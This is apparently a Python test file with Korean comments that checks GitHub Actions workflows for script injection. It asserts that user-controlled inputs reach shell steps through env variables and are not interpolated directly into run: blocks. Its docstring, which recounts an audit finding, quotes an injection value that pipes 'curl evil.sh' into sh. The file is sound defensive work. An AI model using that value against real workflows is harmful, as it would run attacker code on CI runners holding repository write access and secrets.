"""워크플로 스크립트 인젝션 계약 검사.

배경(2026-08-11 감사): deposit.yml이 입금 메모를 run: 블록에 직접 보간했다.

    python -m quant deposit --memo "${{ github.event.inputs.memo }}"

GitHub는 셸보다 **먼저** ${{ }}를 문자열로 갈아끼운다. 그래서 메모에

    "; curl evil.sh | sh; #

같은 값을 넣으면 러너에서 임의 명령이 실행된다 — 그 잡은 contents: write
권한과 디스코드·텔레그램 시크릿을 들고 있다. build-app.yml의 자유 입력
version에도 같은 구멍이 있었다.

env로 전달하면 셸이 값을 '데이터'로만 보므로 안전하다.

핵심 계약: run: 블록 안에서 사용자 제어 값을 ${{ }}로 직접 펼치지 않는다.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

WF = Path(__file__).resolve().parent.parent / ".github" / "workflows"

# 공격자가 값을 정할 수 있는 컨텍스트. secrets·vars·matrix·env는 제외
# (운영자가 정하고, 셸에 값이 아니라 이름으로 들어가는 경우가 대부분).
_USER_CONTROLLED = re.compile(
    r"\$\{\{\s*(?:github\.event\.inputs\.|inputs\.|github\.head_ref"
    r"|github\.ref_name|github\.event\.(?:issue|pull_request|comment|"
    r"discussion|review)\b)")


def _run_blocks(text: str):
    """`run: |` 블록의 본문만 뽑는다(env: 매핑은 제외된다)."""
    for m in re.finditer(r"\n(\s+)run:\s*[|>]?\s*\n((?:(?:\1\s+).*\n|\s*\n)+)",
                         text):
        yield m.group(2)


def test_no_user_input_interpolated_into_shell():
    bad = []
    for path in sorted(WF.glob("*.yml")):
        for block in _run_blocks(path.read_text("utf-8")):
            for m in _USER_CONTROLLED.finditer(block):
                line = block[block.rfind("\n", 0, m.start()) + 1:
                             block.find("\n", m.start())].strip()
                bad.append(f"{path.name}: {line[:100]}")
    assert not bad, (
        "run: 블록에 사용자 제어 값을 직접 펼쳤습니다(스크립트 인젝션). "
        "env:로 전달한 뒤 \"$VAR\"로 쓰세요.\n  " + "\n  ".join(bad))


def test_deposit_passes_inputs_through_env():
    src = (WF / "deposit.yml").read_text("utf-8")
    assert "DEPOSIT_AMOUNT: ${{ github.event.inputs.amount }}" in src
    assert 'python -m quant deposit --amount "$DEPOSIT_AMOUNT"' in src
    assert '--memo "$DEPOSIT_MEMO"' in src


def test_build_version_passes_through_env():
    src = (WF / "build-app.yml").read_text("utf-8")
    assert "IN_VERSION: ${{ github.event.inputs.version }}" in src
    assert 'v="$IN_VERSION"' in src


def test_deposit_amount_is_bounded_in_python():
    """워크플로를 통과해도 파이썬이 다시 막는다(이중 방어)."""
    import pytest

    from quant.live.daily import add_deposit
    for bad in (0, -1, 10_000_001):
        with pytest.raises(ValueError):
            add_deposit(bad)


def test_detector_catches_a_known_bad_pattern():
    """탐지기 자체가 살아 있는가 — 통과만 하는 테스트는 증인이 못 된다."""
    sample = '\n  run: |\n    echo "${{ github.event.inputs.memo }}"\n'
    hits = [m for b in _run_blocks(sample)
            for m in _USER_CONTROLLED.finditer(b)]
    assert hits
